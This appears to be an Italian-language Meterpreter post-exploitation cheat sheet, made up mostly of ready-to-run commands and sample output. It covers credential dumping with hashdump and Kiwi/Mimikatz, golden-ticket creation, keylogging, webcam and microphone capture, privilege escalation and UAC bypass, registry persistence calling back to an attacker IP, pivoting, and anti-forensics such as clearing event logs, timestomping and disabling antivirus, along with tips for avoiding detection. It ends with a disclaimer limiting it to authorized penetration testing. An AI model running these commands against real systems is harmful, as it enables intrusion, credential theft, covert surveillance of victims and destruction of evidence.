# 🎭 Meterpreter - Scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Uno strumento completo di post-exploitation** - Gli strumenti a disposizione dopo aver ottenuto l'accesso

> **Nota sulle implementazioni:** DLL, socket dello stager, esecuzione in memoria e TLS descrivono specifiche varianti, non ogni implementazione o trasporto di Meterpreter. Gli script `persistence`, `metsvc`, `winenum` e altri esempi legacy possono non essere disponibili nella versione installata. `exit` chiude la sessione, mentre `background` la mantiene; `getsystem` tenta un’elevazione e non è una semplice verifica dei privilegi ([gestione delle sessioni](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/)). Migrare in LSASS o in altri processi sensibili non è universalmente sicuro né un requisito generale per `hashdump`; le operazioni dipendono da privilegi, architettura e protezioni del sistema.

---

## 📋 Indice

- [Che cos'è Meterpreter?](#-che-cosè-meterpreter)
- [Comandi principali](#-comandi-principali)
- [Informazioni sul sistema](#-informazioni-sul-sistema)
- [Comandi del file system](#-comandi-del-file-system)
- [Comandi di rete](#-comandi-di-rete)
- [Comandi sui processi](#-comandi-sui-processi)
- [Comandi per utenti e privilegi](#-comandi-per-utenti-e-privilegi)
- [Raccolta delle password](#-raccolta-delle-password)
- [Registrazione dei tasti (keylogging)](#-registrazione-dei-tasti-keylogging)
- [Screenshot e webcam](#-screenshot-e-webcam)
- [Persistenza](#-persistenza)
- [Pivoting e inoltro delle porte](#-pivoting-e-inoltro-delle-porte)
- [Anti-forensics](#-anti-forensics)
- [Scripting e automazione](#-scripting-e-automazione)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Consigli pratici](#-consigli-pratici)

---

## 🎯 Che cos'è Meterpreter?

**Meterpreter** (Meta-Interpreter) è un payload avanzato ed estensibile dinamicamente che opera tramite iniezione di DLL in memoria e comunica attraverso il socket dello stager.

### Funzionalità principali

| Funzionalità | Descrizione |
|---------|-------------|
| **Esecuzione in memoria** | Viene eseguito interamente in RAM, lasciando poche tracce |
| **Comunicazione cifrata** | Canale cifrato TLS verso il server di comando e controllo (C2) |
| **Estensibile** | Carica estensioni durante l'esecuzione |
| **Multipiattaforma** | Windows, Linux, macOS, Android, PHP, Java |
| **Supporto al pivoting** | Instrada il traffico attraverso host compromessi |

### Tipi di Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

## ⌨ Comandi principali

### Guida e navigazione

```bash
# Visualizza tutti i comandi
meterpreter > help

# Ottieni la guida per un comando specifico
meterpreter > help upload

# Mostra le informazioni sui canali
meterpreter > channel -l
```

### Gestione delle sessioni

```bash
# Ottieni informazioni sulla sessione
meterpreter > info

# Metti in background la sessione corrente
meterpreter > background
meterpreter > bg

# Torna a msfconsole
meterpreter > exit

# Termina completamente la sessione
meterpreter > quit

# Ricollegati se la connessione si interrompe
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Operazioni sui canali

```bash
# Elenca i canali attivi
meterpreter > channel -l

# Interagisci con il canale
meterpreter > channel -i <id>

# Leggi dal canale
meterpreter > channel -r <id>

# Scrivi sul canale
meterpreter > channel -w <id>

# Chiudi il canale
meterpreter > channel -c <id>
```

---

## 💻 Informazioni sul sistema

### Informazioni di base sul sistema

```bash
# Ottieni informazioni sul sistema
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Ottieni l'utente corrente
meterpreter > getuid
Server username: WIN-PC\Administrator

# Ottieni l'ID del processo corrente
meterpreter > getpid
Current pid: 1234

# Ottieni il nome del processo
meterpreter > getpname

# Verifica se l'esecuzione avviene in una macchina virtuale
meterpreter > run post/windows/gather/checkvm
```

### Ambiente e registro

```bash
# Elenca le variabili d'ambiente
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Imposta una variabile d'ambiente
meterpreter > setenv VAR value

# Operazioni sul registro (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Software e aggiornamenti installati

```bash
# Elenca le applicazioni installate
meterpreter > run post/windows/gather/enum_applications

# Elenca patch e hotfix installati
meterpreter > run post/windows/gather/enum_patches

# Verifica i percorsi dei servizi senza virgolette
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 Comandi del file system

### Navigazione

```bash
# Visualizza la directory di lavoro
meterpreter > pwd
C:\Users\Administrator\Desktop

# Elenca il contenuto della directory
meterpreter > ls
meterpreter > ls -la

# Cambia directory
meterpreter > cd C:\\Users
meterpreter > cd ..

# Mostra la directory locale corrente
meterpreter > lpwd

# Cambia la directory locale
meterpreter > lcd /tmp

# Elenca la directory locale
meterpreter > lls
```

### Operazioni sui file

```bash
# Leggi il contenuto del file
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Modifica il file
meterpreter > edit C:\\file.txt

# Elimina il file
meterpreter > rm C:\\temp\\malware.exe

# Crea una directory
meterpreter > mkdir C:\\temp\\hidden

# Rimuovi la directory
meterpreter > rmdir C:\\temp\\hidden

# Copia il file
meterpreter > cp source.txt destination.txt

# Sposta o rinomina il file
meterpreter > mv oldname.txt newname.txt
```

### Trasferimento di file

```bash
# Scarica un file dal bersaglio
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Scarica ricorsivamente
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Carica un file sul bersaglio
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Mostra l'avanzamento di download e upload
meterpreter > download -p C:\\large_file.zip
```

### Ricerca dei file

```bash
# Cerca i file
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Cerca un'estensione specifica in tutte le unità
meterpreter > search -f *.kdbx

# Cerca nomi di file che corrispondono a schemi specifici
meterpreter > search -f *password* -r
```

### Hash e timestamp dei file

```bash
# Ottieni il checksum del file
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Modifica i timestamp (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Comandi di rete

### Informazioni sulla rete

```bash
# Ottieni le interfacce di rete
meterpreter > ipconfig
meterpreter > ifconfig

# Ottieni la tabella di routing
meterpreter > route

# Ottieni la cache ARP
meterpreter > arp

# Ottieni le connessioni di rete attive
meterpreter > netstat
```

### Inoltro delle porte (port forwarding)

```bash
# Inoltra una porta locale a una remota
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Elenca gli inoltri delle porte
meterpreter > portfwd list

# Elimina un inoltro di porta
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Rimuovi tutti gli inoltri delle porte
meterpreter > portfwd flush

# Esempio: inoltro RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Ora collegati: rdesktop 127.0.0.1:3389
```

### Utilità DNS e di rete

```bash
# Risolvi il nome host
meterpreter > resolve google.com

# Ottieni le impostazioni del proxy
meterpreter > run post/windows/gather/enum_proxy
```

---

## ⚙ Comandi sui processi

### Elenco dei processi

```bash
# Elenca tutti i processi
meterpreter > ps

# Filtra i processi
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Ottieni informazioni sul processo corrente
meterpreter > getpid
```

### Manipolazione dei processi

```bash
# Migra verso un altro processo
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Termina un processo
meterpreter > kill <PID>

# Esegui un comando e ottieni l'output
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Esegui in background
meterpreter > execute -f notepad.exe -H

# Esegui con I/O tramite canale
meterpreter > execute -f cmd.exe -c -i
```

### Consigli sulla migrazione dei processi

```bash
# Processi indicati nell'originale come destinazioni di migrazione sicure (Windows)
# - explorer.exe (contesto utente, stabile)
# - svchost.exe (SYSTEM, più istanze)
# - lsass.exe (SYSTEM, indicato nell'originale per hashdump)

# Individua explorer.exe ed esegui la migrazione
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Migra automaticamente verso un processo stabile
meterpreter > run post/windows/manage/migrate
```

---

## 👤 Comandi per utenti e privilegi

### Informazioni sull'utente corrente

```bash
# Ottieni l'utente corrente
meterpreter > getuid
Server username: WIN-PC\Administrator

# Ottieni i privilegi correnti
meterpreter > getprivs

# Verifica se i privilegi sono elevati (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Escalation dei privilegi

```bash
# Tenta di ottenere privilegi SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Impersonificazione tramite named pipe (in memoria/amministratore)
meterpreter > getsystem -t 2  # Impersonificazione tramite named pipe (dropper/amministratore)
meterpreter > getsystem -t 3  # Duplicazione del token (in memoria/amministratore)

# Aggiramento di UAC (da msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Suggeritore di exploit locali
meterpreter > run post/multi/recon/local_exploit_suggester

# Acquisisci il token di un altro processo
meterpreter > steal_token <PID>

# Abbandona il token acquisito
meterpreter > drop_token

# Impersona un utente
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Elenca i token disponibili
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Enumerazione degli utenti

```bash
# Elenca gli utenti locali
meterpreter > run post/windows/gather/enum_logged_on_users

# Elenca gli utenti di dominio (se il sistema appartiene al dominio)
meterpreter > run post/windows/gather/enum_domain_users

# Elenca i gruppi locali
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Raccolta delle password

### Estrazione degli hash

```bash
# Estrai gli hash delle password (richiede SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Se hashdump non riesce, prova
meterpreter > run post/windows/gather/smart_hashdump
```

### Estensione Mimikatz / Kiwi

```bash
# Carica Kiwi (Mimikatz)
meterpreter > load kiwi

# Recupera tutte le credenziali
meterpreter > creds_all

# Ottieni le password dalla memoria
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Estrai i ticket Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Ottieni le password WiFi
meterpreter > kiwi_cmd misc::wifi

# Estrazione dei dati LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Raccolta delle credenziali

```bash
# Cerca credenziali nei file
meterpreter > run post/multi/gather/credentials/generic

# Credenziali dei browser
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Chiavi SSH
meterpreter > run post/multi/gather/ssh_creds

# Gestione credenziali Windows
meterpreter > run post/windows/gather/enum_cred_store

# Credenziali Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

## ⌨ Registrazione dei tasti (keylogging)

### Avvio e arresto del keylogger

```bash
# Avvia il keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Estrai i tasti registrati
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Arresta il keylogger
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Keylogging avanzato

```bash
# Esegui il keylogger come processo separato
meterpreter > run post/windows/capture/keylog_recorder

# Migra verso un processo con accesso alla tastiera (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Screenshot e webcam

### Screenshot

```bash
# Acquisisci un singolo screenshot
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Acquisisci uno screenshot con percorso personalizzato
meterpreter > screenshot -p /tmp/screen.jpg

# Screenshot continui
meterpreter > run post/multi/gather/screen_spy

# Visualizza il desktop in tempo reale
meterpreter > screenshare
```

### Operazioni sulla webcam

```bash
# Elenca le webcam
meterpreter > webcam_list
1: Integrated Webcam

# Acquisisci un'immagine dalla webcam
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Acquisisci un'immagine con opzioni
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Trasmetti dalla webcam in tempo reale
meterpreter > webcam_stream
```

### Registrazione audio

```bash
# Registra il microfono
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Registra con durata personalizzata
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Persistenza

### Persistenza su Windows

```bash
# Persistenza tramite registro
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Persistenza tramite attività pianificate
meterpreter > run post/windows/manage/persistence_exe

# Persistenza tramite servizio
meterpreter > run metsvc

# Persistenza WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Spiegazione delle opzioni di persistenza

```bash
# Opzioni dello script persistence
-A        # Avvia automaticamente un handler compatibile
-L <path> # Percorso in cui scrivere il payload
-P <path> # Payload da utilizzare
-S        # Avvia come servizio (con SYSTEM)
-T        # Modello EXE alternativo
-U        # Avvia all'accesso dell'utente
-X        # Avvia all'avvio del sistema
-i <sec>  # Intervallo tra i tentativi di connessione
-p <port> # Porta a cui il payload deve collegarsi
-r <ip>   # IP a cui il payload deve collegarsi
```

### Rimozione della persistenza

```bash
# Elenca i meccanismi di persistenza
meterpreter > run post/windows/gather/enum_persistence

# Rimuovi la persistenza (manualmente)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Pivoting e inoltro delle porte

### Gestione delle rotte

```bash
# Aggiungi una rotta attraverso la sessione
meterpreter > run autoroute -s 10.10.10.0/24

# Visualizza le rotte
meterpreter > run autoroute -p

# Elimina la rotta
meterpreter > run autoroute -d -s 10.10.10.0/24

# Da msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### Proxy SOCKS

```bash
# Avvia il proxy SOCKS (da msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configura proxychains
# Modifica /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Utilizza con proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Esempi di inoltro delle porte

```bash
# Inoltra una porta locale a un host interno
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Inoltro inverso di porta
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Scenari di esempio:
# Accedi al server web interno
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Accedi a RDP interno
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Accedi a SMB interno
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Anti-forensics

### Rimozione delle evidenze

```bash
# Cancella i log eventi di Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Modifica i timestamp dei file
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Tecniche di elusione

```bash
# Migra verso un processo legittimo
meterpreter > migrate -N svchost.exe

# Verifica se il sistema è monitorato
meterpreter > run post/windows/gather/enum_av

# Disabilita l'antivirus (rischioso)
meterpreter > run post/windows/manage/killav

# Nascondi il processo
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Scripting e automazione

### Script di risorse

```bash
# Crea uno script di risorse
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Esegui lo script di risorse
meterpreter > resource post_exploit.rc
```

### Script comuni

```bash
# Enumerazione del sistema
meterpreter > run scraper

# Raccogli tutte le informazioni
meterpreter > run winenum

# Verifica la presenza di macchine virtuali
meterpreter > run checkvm

# Ottieni le sottoreti locali per il pivoting
meterpreter > run get_local_subnets

# Ricognizione multipiattaforma
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Shell IRB (Ruby)

```bash
# Entra nella modalità IRB
meterpreter > irb

# Esempio: elenca i file
>> client.fs.dir.entries("C:\\")

# Esempio: leggi un file
>> client.fs.file.open("C:\\secret.txt").read

# Esci da IRB
>> exit
```

---

## 📊 Tabella di riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `sysinfo` | Informazioni sul sistema |
| `getuid` | Utente corrente |
| `getpid` | ID del processo corrente |
| `ps` | Elenca i processi |
| `migrate <PID>` | Spostati in un altro processo |
| `getsystem` | Eleva i privilegi a SYSTEM |
| `hashdump` | Estrai gli hash delle password |
| `shell` | Apri una shell di sistema |
| `upload <src> <dst>` | Carica il file |
| `download <src>` | Scarica il file |
| `screenshot` | Acquisisci lo schermo |
| `webcam_snap` | Immagine della webcam |
| `keyscan_start` | Avvia il keylogger |
| `keyscan_dump` | Ottieni i tasti registrati |

### Operazioni sui file

| Comando | Descrizione |
|---------|-------------|
| `pwd` | Visualizza la directory di lavoro |
| `cd <dir>` | Cambia directory |
| `ls` | Elenca i file |
| `cat <file>` | Leggi il file |
| `edit <file>` | Modifica il file |
| `rm <file>` | Elimina il file |
| `mkdir <dir>` | Crea una directory |
| `search -f <pattern>` | Cerca i file |

### Operazioni di rete

| Comando | Descrizione |
|---------|-------------|
| `ipconfig` | Interfacce di rete |
| `route` | Tabella di routing |
| `netstat` | Connessioni attive |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Inoltra la porta |
| `run autoroute -s <subnet>` | Aggiungi una rotta per il pivoting |

### Escalation dei privilegi

| Comando | Descrizione |
|---------|-------------|
| `getsystem` | Ottieni privilegi SYSTEM |
| `getprivs` | Elenca i privilegi correnti |
| `steal_token <PID>` | Acquisisci il token di un processo |
| `load incognito` | Carica l'estensione incognito |
| `list_tokens -u` | Elenca i token disponibili |
| `impersonate_token` | Impersona il token dell'utente |

### Raccolta delle credenziali

| Comando | Descrizione |
|---------|-------------|
| `hashdump` | Estrai gli hash SAM |
| `load kiwi` | Carica Mimikatz |
| `creds_all` | Tutte le credenziali |
| `lsa_dump_sam` | Estrazione SAM tramite LSA |
| `kiwi_cmd <cmd>` | Esegui un comando Mimikatz |

---

## 💡 Consigli pratici

### Buone pratiche

1. **Migra sempre prima di tutto**
   ```bash
   # Migra verso un processo stabile prima di altre operazioni
   meterpreter > migrate -N explorer.exe
   ```

2. **Sessioni in background**
   ```bash
   # Non chiudere le sessioni, mettile in background
   meterpreter > background
   ```

3. **Utilizza payload cifrati**
   ```bash
   # Preferisci payload HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Verifica prima di agire**
   ```bash
   # Verifica sempre i privilegi
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Risoluzione dei problemi

| Problema | Soluzione |
|-------|----------|
| La sessione termina | Migra verso un processo stabile |
| hashdump non riesce | Ottieni prima SYSTEM con `getsystem` |
| getsystem non riesce | Prova una tecnica diversa `-t 1,2,3` |
| Il keylogger non restituisce dati | Migra verso explorer.exe |
| I comandi scadono per timeout | Verifica la connettività di rete |

### Consigli per ridurre la visibilità

```bash
# 1. Migra dal processo iniziale
meterpreter > migrate -N svchost.exe

# 2. Rimuovi le tracce
meterpreter > clearev

# 3. Utilizza timestomp sui file caricati
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Elimina i file depositati al termine
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠ Avvertenza legale

> **ATTENZIONE:** questa scheda è destinata esclusivamente all'apprendimento e ai penetration test autorizzati. L'accesso non autorizzato ai sistemi informatici è illegale. Ottieni sempre l'autorizzazione prima dei test.

---

## 📚 Risorse correlate

- [Guida a Metasploit Framework](./README.it.md)
- [Documentazione Offensive Security](https://www.offensive-security.com/)
- [Documentazione Rapid7 Metasploit](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Padroneggia la post-exploitation!</b><br>
  <i>Con Meterpreter, le attività proseguono dopo l'accesso iniziale</i>
</p>
